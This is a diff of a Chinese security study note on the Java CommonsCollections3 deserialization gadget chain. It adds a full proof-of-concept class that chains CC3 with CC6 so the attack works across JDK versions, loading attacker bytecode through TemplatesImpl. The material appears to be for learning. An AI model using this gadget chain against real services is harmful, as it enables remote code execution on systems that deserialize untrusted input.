@@ -411,13 +411,18 @@ public class CC3_1 {
 ![image](https://user-images.githubusercontent.com/84888757/205983453-ee4d20f0-65b9-43d2-8bd5-6fee14daefb8.png)
 
 ## 3.3 CC3的改造思路
-此时上面的初版 `CC3_1 POC` 和 `ysoserial` 中的 `CC3` 还是有所区别的，在 `ysoserial` 中，并没有使用 `InvokerTransformer` 调用 `newTransformer` 来生成 `Transformer` 对象，而是使用了如下方法：
+再次借用一下白日梦组长的图来展现一下 `ysoserial` 中的 `CC3` 
+
+<img width="1115" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/6d261372-c93b-4e93-a060-2f95f1db4907">
+
+此时会发现，上面的初版 `CC3_1 POC` 和 `ysoserial` 中的 `CC3` 还是有所区别的，在 `ysoserial` 中，并没有使用 `InvokerTransformer` 调用 `newTransformer` 来生成 `Transformer` 对象，而是使用了如下方法：
+
 ```java
-		final Transformer[] transformers = new Transformer[] {
-				new ConstantTransformer(TrAXFilter.class),
-				new InstantiateTransformer(
-						new Class[] { Templates.class },
-						new Object[] { templatesImpl } )};
+final Transformer[] transformers = new Transformer[] {
+		new ConstantTransformer(TrAXFilter.class),
+		new InstantiateTransformer(
+				new Class[] { Templates.class },
+				new Object[] { templatesImpl } )};
 ```
 
 这是由于2015年之后出现了反序列化过滤工具  [SerialKiller](https://github.com/ikkisoft/SerialKiller/blob/master/config/serialkiller.conf) ，它的黑名单将 `InvokerTransformer` 纳入其中，切断了 `CC1` 的使用。
@@ -663,9 +668,131 @@ public class EvilTemplatesImpl extends AbstractTranslet {
 
 }
 ```
+# 0x04 通杀CC3
+CC3链同CC1链一样，都会有 `JDK<=8u71` 的限制。
+
+我们可以结合前面学的CC6链（实际上是P神的简化版CC6），将其改造成一个通杀的链子。
+
+就是下图中的红线走向：
+
+<img width="1115" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/7ccb7a36-187f-4216-8fa3-0df22d8a5254">
+
+📒 CC3_CC6.java
+```java
+package org.vulhub.Ser;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.NotFoundException;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3_CC6 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException, NotFoundException, CannotCompileException {
+        // 直接把base64编码后的字节码进行加载的写法
+        //        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
+
+        // 加载class路径写法1
+        //byte[] code = Files.readAllBytes(Path.s.get("D://tmp/classes/evil.class"));
+
+        // 加载class路径写法2
+        byte[] code = ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode();
+
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, "_name", "xxx");
+        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        setFieldValue(templates, "_bytecodes", new byte[][]{code});
 
 
-# 0x04 参考链接
+        // 创建个人畜无害的fakeformers
+        Transformer[] fakeformers = {new ConstantTransformer(1)};
+
+        // 创建真正有危害的 transformers，利用 TrAXFilter 的构造方法去调用 templates.newTransformer()
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
+        };
+
+        //先传入人畜无害的fakeformers避免put时就弹计算器
+        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeformers);
+
+        Map innerMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "xxx");
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(tiedMapEntry, "test");
+        lazyMap.remove("xxx");
+
+        //反射修改 chainedTransformer 中的 iTransformers 为有危害的 transforms
+//       Class clazz = chainedTransformer.getClass();
+//       Field field = clazz.getDeclaredField("iTransformers");
+//       field.setAccessible(true);
+//       field.set(chainedTransformer, transformers);
+        setFieldValue(chainedTransformer,"iTransformers",transformers);
+
+//        //⽣成序列化字符串
+//        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+//        ObjectOutputStream oos = new ObjectOutputStream(bos);
+//        oos.writeObject(hashMap);
+//        oos.close();
+//
+//        //反序列化
+//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray()));
+//        ois.readObject();
+
+        //⽣成序列化字符串
+//        serialize(hashMap);
+        //反序列化
+        unserialize("ser_CC3_CC6.bin");
+    }
+
+    public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException {
+        Class<?> clazz = obj.getClass();
+        Field fieldName = clazz.getDeclaredField(field);
+        fieldName.setAccessible(true);
+        fieldName.set(obj, value);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CC3_CC6.bin");
+        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
+        outputStream.writeObject(obj);
+        outputStream.close();
+        fileOutputStream.close();
+    }
+
+    public static void unserialize(String args) throws IOException, ClassNotFoundException {
+        FileInputStream fileInputStream = new FileInputStream(args);
+        ObjectInputStream ois = new ObjectInputStream(fileInputStream);
+
+        ois.readObject();
+    }
+}
+
+```
+
+
+<img width="1299" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/314affc3-f85a-41ab-8e3b-d8efce422348">
+
+
+# 0x05 参考链接
 - [Java安全漫谈 - 13.Java中动态加载字节码的那些方法](https://t.zsxq.com/E2VfUVB)
 - [Java安全漫谈 - 14.为什么需要CommonsCollections3](https://t.zsxq.com/i6Y7QN7)
 
